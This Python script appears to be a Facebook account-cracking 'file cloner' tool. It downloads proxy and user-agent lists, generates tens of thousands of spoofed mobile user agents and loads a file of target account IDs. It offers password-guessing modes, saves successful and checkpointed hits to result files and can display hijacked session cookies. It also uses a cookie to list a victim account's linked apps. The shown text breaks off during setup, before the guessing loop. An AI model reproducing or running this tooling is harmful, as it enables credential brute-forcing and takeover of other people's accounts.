import os 
import requests,bs4,json,os,sys,random,uuid,datetime,time,re
import urllib3,rich,base64
import requests,zlib,platform
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#os.system('xdg-open https://facebook.com/groups/2820745694810592/')
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J701MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.1; SM-T560NU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://github.com/Arzen-Tools/Api/blob/main/prox.txt').text
	open('.prox.txt','w').write(prox)
	
except Exception as e:
	print()
prox=open('.prox.txt','r').read().splitlines()
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])

for xd in range(10000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c=f' en-us; {str(gt)}'
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for agent in range(10000):
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/533.1'
	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(fullagnt)
for xttttd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaN8-00/012.002;'
    e=random.randrange(100, 9999)
    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='7.3.0 Mobile Safari/533.4 3gpp-gba'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen.append(uaku)
    ###----------[ User Agent Linux ]---------- ###
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Redmi 6A Build/N2G47H)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
#User Agnes buatan Asep Yusup 
    rr = random.randint
    rc = random.choice
    satu = f"Mozilla/5.0 (Linux; Android {str(rr(211111,299999))}; CPH2457) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36"
    dua  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Infinix X671) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    tiga  = f"Mozilla/5.0 (Linux; Android {str(rr(111111,199999))}; 4188S Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) {str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Version/4.0 Chrome/ {str(rr(2111111,2999999))} Mobile Safari/537.36"
    empat  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Moto X40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    uaku2 = str(rc([satu,dua,tiga,empat]))
    ugen.append(uaku2)
ruz=[]
for mtc in range(10000):
	rr=random.randint
	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
	ruz.append(xd)
ugen=[]
for brayen in range(10000):
    rr = random.randint
    rc = random.choice
    u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-A405FN Build/RP1A.{str(rr(111111,210000))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J610G Build/PPR1.{str(rr(111111,210000))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u3 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-G610M Build/PKQ1.{str(rr(111111,210000))}.018; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u4 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; CPH2109 Build/RKQ1.{str(rr(111111,210000))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u5 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J120H Build/PKQ1.{str(rr(111111,210000))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    voda = random.choice([u1, u2, u3, u4, u5])
    ugen.append(voda)
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Tizen'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='SAMSUNG SM-R835F)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.0 Chrome/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)
for agttent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
#--------my ua
for txt in range (10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['9','10','11','12','13','14','15'])
	c='Infinix X6816 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/353.0.0.5.112;]'
	ffg=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(ffg)
for txxxtt in range (10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['9','10','11','12','13','14','15'])
	c='Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	ffg=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(ffg)
for txrelmet in range (10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['9','10','11','12','13','14','15'])
	c='RMX3081 Build/RKQ1.201112.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36[FBAN/EMA;FBLC/pt_PT;FBAV/294.0.0.12.118;]'
	ffg=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(ffg)
for txret in range (10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['9','10','11','12','13','14','15'])
	c='RMX2156 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/313.0.0.7.110;]'
	ffg=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(ffg)
for txoppt in range (10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['9','10','11','12','13','14','15'])
	c='CPH1969 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,250)
	h='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/344.0.0.10.83;]'
	ffg=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(ffg)
#-------____----_____-----_-----_---__-
for xffd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
#-_-_-_--_-_-_-_-_6_-_6_-_-_6_6_6
#-$6$-_-$-$-$76$6$6$-$-$
	aa='Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X)'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/15E148 Safari/605.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/Arzen-Tools/ua/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
cpx=[]
cokix=[]
apkx=[]
def line():
	print(40*"=")
def back():
	Main()
###############
B = '\x1b[1;90m'
R = '\x1b[1;91m'
G = '\x1b[1;92m'
H = '\x1b[1;93m'
BL = '\x1b[1;94m'
BG = '\x1b[1;95m'
S = '\x1b[1;96m'
W = '\x1b[1;97m'
EX = '\x1b[0m'
E = '\33[m'
################
P = '\x1b[1;97m'
M = '\x1b[1;91m'
K = '\x1b[1;93m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])


pwpluss,pwnya=[],[]
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def njshdfcc(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
def back():
	login()
################
def cek_apk(session,kuki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":kuki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r  {BG}[{W}+{BG}] {W}SORRY THERE IS NO ACTIVE APK{E}')
	else:
		print(f'\r{BG}  [{W}+{BG}]{W} YOUR ACTIVE APPLICATION DETAILS{E} ')
		for i in range(len(game)):
			print(f"\r%s  [%s] %s %s "%(G,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),E))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":kuki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r{BG}  [{W}+{BG}]{W} SORRY THERE IS NO EXPIRED APK{W}')
	else:
		print(f'\r  {BG}[{W}+{BG}]{W} YOUR EXPIRED APPLICATION DETAILS{E}')
		for i in range(len(game)):
			print(f"\r%s  [%s] %s %s "%(S,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),E))
#################
version="1.04"
def logo():
	os.system("clear")
	print(f"""\x1b[1;94m╔═════════════════════════════════════════════════════╗
\x1b[1;94m║                                                     ║
\x1b[1;94m║  \x1b[1;92m  ██   ██ \033[1;33m██   ██ \x1b[1;91m █████  \x1b[1;94m██	 \x1b[1;96m    ██ \x1b[1;95m██████    \x1b[1;94m    ║
\x1b[1;94m║  \x1b[1;92m  ██  ██  \033[1;33m██   ██ \x1b[1;91m██   ██ \x1b[1;94m██	 \x1b[1;96m    ██ \x1b[1;95m██   ██  \x1b[1;94m     ║
\x1b[1;94m║  \x1b[1;92m  █████   \033[1;33m███████ \x1b[1;91m███████ \x1b[1;94m██	 \x1b[1;96m    ██ \x1b[1;95m██   ██   \x1b[1;94m    ║
\x1b[1;94m║  \x1b[1;92m  ██  ██  \033[1;33m██   ██ \x1b[1;91m██   ██ \x1b[1;94m██	 \x1b[1;96m    ██ \x1b[1;95m██   ██  \x1b[1;94m     ║
\x1b[1;94m║  \x1b[1;92m  ██   ██ \033[1;33m██   ██ \x1b[1;91m██   ██ \x1b[1;94m███████ \x1b[1;96m██ \x1b[1;95m██████   \x1b[1;94m     ║
\x1b[1;94m║                                                     ║
\x1b[1;94m╚═════════════════════════════════════════════════════╝

\x1b[1;94m╔═════════════════════════════════════════════════════╗
\x1b[1;94m║                 \x1b[1;91m[\x1b[1;92m+\x1b[1;91m]\x1b[1;92mPRO FILE CLONER\x1b[1;91m[\x1b[1;92m+\x1b[1;91m]               \x1b[1;94m║
\x1b[1;94m╚═════════════════════════════════════════════════════╝

\x1b[1;94m╔═════════════════════════════════════════════════════╗
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] DEVELOPER      :        ARZEN RAMOS CRESCENT     \x1b[1;94m║
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] FACEBOOK       :        ARZEN RAMOS CRESCENTツ   \x1b[1;94m║
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] WHATSAPP       :        +639168364596            \x1b[1;94m║
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] GITHUB         :        ARZEN-TOOLS 	      \x1b[1;94m║
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] YOUTUBE        :        ARZEN TOOLS              \x1b[1;94m║
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] TOOLS          :        FILE CLONING             \x1b[1;94m║
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] STATUS         :        FREE                     \x1b[1;94m║
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] VERSION        :        0.0.1                    \x1b[1;94m║
\x1b[1;94m╚═════════════════════════════════════════════════════╝""")
loooop = 0
def aprv():
	logo()
	while loooop < 1000000000000:
		password = input(f'  {W}Tools Login Password:{G} ')
		if password == 'ARZENTOOLS-404':
			print(f'\n\t {G}Logged In Successfully{W}');time.sleep(1)
			Main()
		else:
			print(f'\n\t {R}Incorrect  Password {W}');time.sleep(1)
			aprv()  
#------------------[ MAIN ]-----------------#
def Main():
	logo()
	o = input(f'  {W}[!] PUT FILE PATH : {G}')
	print('')
	try:lin = open(o).read().splitlines()
	except:
		print(f'{W}  [!] FILE LOCATION NOT FOUND ')
		time.sleep(2)
		back()
	for xid in lin:
		id.append(xid)
	setting()
#$#$######
def setting():
	logo();print(f"  {W}[{S}A{W}]{W}{R}[{W}-3{R}]{W} PASSWORD {R}[{W}V-FAST{R}]{W}\n  {W}[{S}B{W}]{W}{R}[{W}12{R}]{W} PASSWORD {R}[{W}MEDIUM{R}]{W}\n  {W}[{S}C{W}]{W}{R}[{W}22{R}]{W} PASSWORD {R}[{W}X-SLOW{R}]{W}\n  {W}[{S}D{W}]{W}{R}[{W}0X{R}]{W} PASSWORD {R}[{W}X-SLOW{R}]{W}{R}[{W}CHOICE-PASS{R}]{W}");line()
	mh=input(f"  [{S}+{W}] Choice: ")
	logo();print(f'  [{S}+{W}] Do you went show cp account (y/n)');line()
	cx=input(f'  [{S}+{W}] CHOOSE: ')
	if cx in ['n','N','no','NO','2']:
		cpx.append(f'n')
	else:
		cpx.append(f'y')
	logo();print(f"  [{S}+{E}] Do you went show cookie (y/n) ");line()
	ckiv=input(f"  [{S}+{E}] Choice : ")
	if ckiv in ['n','N','no','NO','2']:
		cokix.append(f'n')
	else:
		cokix.append(f'y')
	logo();print(f"  [{S}+{E}] Do you went show apk (y/n) ");line()
